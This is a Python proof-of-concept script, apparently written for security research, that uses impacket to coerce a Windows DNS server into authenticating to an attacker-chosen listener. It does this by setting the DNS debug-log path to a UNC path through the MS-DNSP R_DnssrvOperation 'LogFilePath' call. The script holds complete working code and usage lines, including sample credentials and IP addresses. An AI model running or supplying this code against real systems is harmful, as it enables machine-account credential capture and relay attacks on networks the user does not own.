#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with
# MS-DNSP::R_DnssrvOperation() using the "LogFilePath" operation (opnum 0).
#
# LogFilePath sets the DNS debug-log file path. Per [MS-DNSP], pData (typed
# DNSSRV_TYPEID_LPWSTR) is "an absolute or relative pathname ... for the debug
# log file on the DNS server", and the server opens the path IMMEDIATELY on set
# (no restart, no separate "enable logging" step). A UNC path makes the DNS
# server (running as the machine account) authenticate to the listener.
#
# Interface 50abc2a4-574d-40b3-9d66-ee4fd5fba076 v5.0 over ncacn_ip_tcp (the
# endpoint is resolved via the endpoint mapper; the \PIPE\DNSSERVER named pipe is
# not present on current Windows). Requires DnsAdmins (server-level write on the
# DNS Server Configuration ACL).
#
#   ./coerce_poc.py -d LAB.local -u dnsadmin -p 'Password123!' 192.168.1.10 192.168.1.30
#     (positional order: <listener> <target>)  ; add --revert to reset LogFilePath to empty
import sys, argparse
from impacket import system_errors
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.ndr import NDRCALL, NDRUNION
from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, LPCSTR, NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin

MSRPC_UUID_DNSP = ('50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0')
DNSSRV_TYPEID_LPWSTR = 3


class DCERPCSessionError(DCERPCException):
    def __str__(self):
        k = self.error_code
        if k in system_errors.ERROR_MESSAGES:
            s, v = system_errors.ERROR_MESSAGES[k]
            return 'SessionError: code: 0x%x - %s - %s' % (k, s, v)
        return 'SessionError: unknown error code: 0x%x' % k


# [in, switch_is(dwTypeId)] DNSSRV_RPC_UNION pData -- for DNSSRV_TYPEID_LPWSTR the
# arm is a wide string. The non-encapsulated union re-transmits the (DWORD) tag.
class DNSSRV_RPC_UNION(NDRUNION):
    commonHdr = (('tag', DWORD),)
    union = {
        DNSSRV_TYPEID_LPWSTR: ('WideString', LPWSTR),
    }


class R_DnssrvOperation(NDRCALL):
    opnum = 0
    structure = (
        ('pwszServerName', LPWSTR),  # server MUST ignore; NULL
        ('pszZone', LPCSTR),         # NULL -> server-level operation
        ('dwContext', DWORD),
        ('pszOperation', LPCSTR),    # "LogFilePath"
        ('dwTypeId', DWORD),         # DNSSRV_TYPEID_LPWSTR (3)
        ('pData', DNSSRV_RPC_UNION),
    )


class R_DnssrvOperationResponse(NDRCALL):
    structure = (('ErrorCode', DWORD),)


def set_logfilepath(dce, value):
    req = R_DnssrvOperation()
    req['pwszServerName'] = NULL
    req['pszZone'] = NULL
    req['dwContext'] = 0
    req['pszOperation'] = 'LogFilePath\x00'
    req['dwTypeId'] = DNSSRV_TYPEID_LPWSTR
    u = DNSSRV_RPC_UNION()
    u['tag'] = DNSSRV_TYPEID_LPWSTR
    u['WideString'] = (value + '\x00') if value is not None else NULL
    req['pData'] = u
    return dce.request(req)


if __name__ == '__main__':
    print("Windows auth coerce using MS-DNSP::R_DnssrvOperation() [LogFilePath]\n")
    p = argparse.ArgumentParser(add_help=True, description="Coerce via MS-DNSP LogFilePath")
    p.add_argument("-u", "--username", default="")
    p.add_argument("-p", "--password", default="")
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--hashes", action="store", metavar="[LM]:NT")
    p.add_argument("--share", default="share", help="share component of the UNC log path")
    p.add_argument("--revert", action="store_true", help="reset LogFilePath to empty (default) and exit")
    p.add_argument("listener", help="listener the target should authenticate to")
    p.add_argument("target", help="target DNS server")
    o = p.parse_args()
    lm, nt = ('', '')
    if o.hashes:
        lm, nt = o.hashes.split(':')

    print("[>] Resolving the DNSP endpoint on %s via the endpoint mapper ..." % o.target)
    sb = epm.hept_map(o.target, uuidtup_to_bin(MSRPC_UUID_DNSP), protocol='ncacn_ip_tcp')
    rt = transport.DCERPCTransportFactory(sb)
    if hasattr(rt, 'set_credentials'):
        rt.set_credentials(o.username, o.password, o.domain, lm, nt)
    dce = rt.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(uuidtup_to_bin(MSRPC_UUID_DNSP))
    print("[>] Bound DNSP.")

    if o.revert:
        try:
            set_logfilepath(dce, "")
        except Exception as e:
            print("[i] revert returned: %s" % e)
        print("[+] LogFilePath reset to empty.")
        sys.exit()

    unc = '\\\\%s\\%s\\dnslog.txt' % (o.listener, o.share)
    print("[>] Setting LogFilePath = %s (server opens it immediately) ..." % unc)
    try:
        set_logfilepath(dce, unc)
        print("[+] Set returned success, check your listener.")
    except Exception as e:
        print("[i] returned: %s" % e)
        print("[i] The call was processed by the target, check your listener.")
    print("[i] Remember to revert:  --revert")
    sys.exit()
